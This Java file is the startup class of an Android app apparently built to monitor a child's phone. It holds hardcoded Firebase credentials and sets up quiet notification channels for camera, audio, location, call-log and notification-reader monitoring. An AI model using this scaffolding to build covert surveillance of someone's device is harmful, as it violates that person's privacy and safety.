package com.monitor.child;

import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.auth.FirebaseAuth;
import com.monitor.child.utils.Constants;

public class ChildApp extends Application {
    public static final String CHANNEL_CAMERA = "channel_camera";
    public static final String CHANNEL_AUDIO = "channel_audio";
    public static final String CHANNEL_LOCATION = "channel_location";

    @Override
    public void onCreate() {
        super.onCreate();
        initFirebase();
        signInAnonymously();
        createNotificationChannels();
    }

    private void initFirebase() {
        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseOptions options = new FirebaseOptions.Builder()
                    .setApplicationId("1:792529827830:android:0e5d3c30731fd172b079d7")
                    .setApiKey("AIzaSyA1Jc_WVmTMzOEqRXThTm4oJEXzqhvpsiM")
                    .setProjectId("sanchat-611e1")
                    .setStorageBucket("sanchat-611e1.firebasestorage.app")
                    .setGcmSenderId("792529827830")
                    .setDatabaseUrl("https://sanchat-611e1-default-rtdb.firebaseio.com")
                    .build();
            FirebaseApp.initializeApp(this, options);
        }
    }

    private void signInAnonymously() {
        if (FirebaseAuth.getInstance().getCurrentUser() == null) {
            FirebaseAuth.getInstance().signInAnonymously();
        }
    }

    private void createNotificationChannels() {
        NotificationManager nm = getSystemService(NotificationManager.class);

        NotificationChannel cameraChannel = new NotificationChannel(
                CHANNEL_CAMERA, "Camera Monitoring",
                NotificationManager.IMPORTANCE_LOW);
        cameraChannel.setDescription("Camera monitoring service");

        NotificationChannel audioChannel = new NotificationChannel(
                CHANNEL_AUDIO, "Audio Monitoring",
                NotificationManager.IMPORTANCE_LOW);
        audioChannel.setDescription("Audio monitoring service");

        NotificationChannel locationChannel = new NotificationChannel(
                CHANNEL_LOCATION, "Location Monitoring",
                NotificationManager.IMPORTANCE_LOW);
        locationChannel.setDescription("Location monitoring service");

        NotificationChannel callLogChannel = new NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_CALL, "Call Log Monitoring",
                NotificationManager.IMPORTANCE_LOW);
        callLogChannel.setDescription("Call log monitoring service");

        NotificationChannel notifChannel = new NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_NOTIF, "Notification Reader",
                NotificationManager.IMPORTANCE_LOW);
        notifChannel.setDescription("Notification reader service");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            cameraChannel.setAllowBubbles(false);
            audioChannel.setAllowBubbles(false);
            locationChannel.setAllowBubbles(false);
            callLogChannel.setAllowBubbles(false);
            notifChannel.setAllowBubbles(false);
        }

        nm.createNotificationChannel(cameraChannel);
        nm.createNotificationChannel(audioChannel);
        nm.createNotificationChannel(locationChannel);
        nm.createNotificationChannel(callLogChannel);
        nm.createNotificationChannel(notifChannel);
    }
}
